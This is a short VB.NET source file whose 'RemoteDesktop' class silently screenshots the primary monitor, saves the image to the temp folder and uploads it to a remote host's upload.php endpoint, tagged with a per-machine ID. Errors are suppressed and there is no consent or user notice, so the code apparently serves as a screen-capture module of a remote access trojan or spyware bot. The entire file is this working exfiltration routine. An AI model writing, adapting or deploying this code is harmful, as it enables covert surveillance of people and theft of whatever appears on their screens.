Imports System.Drawing.Imaging
Imports System.IO

Namespace Other
    Public Class RemoteDesktop
        Public Host As String
        Public ID As String
        Dim TH As Threading.Thread

        Public Function Start()
            Try
                TakeScreen(Path.Combine(IO.Path.GetTempPath, ID & ".png"))
                Return True
            Catch ex As Exception
                Return False
            End Try
        End Function
        Private Function Upload(ByVal screenshot As String)
            Try
                My.Computer.Network.UploadFile(screenshot, Host & "/upload.php?id=" & ID)
                Return True
            Catch ex As Exception
                Return False
            End Try
        End Function
        Public Function TakeScreen(ByVal filename As String)
            Try
                Dim primaryMonitorSize As Size = SystemInformation.PrimaryMonitorSize
                Dim image As New Bitmap(primaryMonitorSize.Width, primaryMonitorSize.Height)
                Dim graphics As Graphics = graphics.FromImage(image)
                Dim upperLeftSource As New Point(0, 0)
                Dim upperLeftDestination As New Point(0, 0)
                graphics.CopyFromScreen(upperLeftSource, upperLeftDestination, primaryMonitorSize)
                graphics.Flush()
                image.Save(filename, ImageFormat.Png)
                Upload(filename)
                Return True
            Catch ex As Exception
                Return ex.Message
            End Try
        End Function
    End Class
End Namespace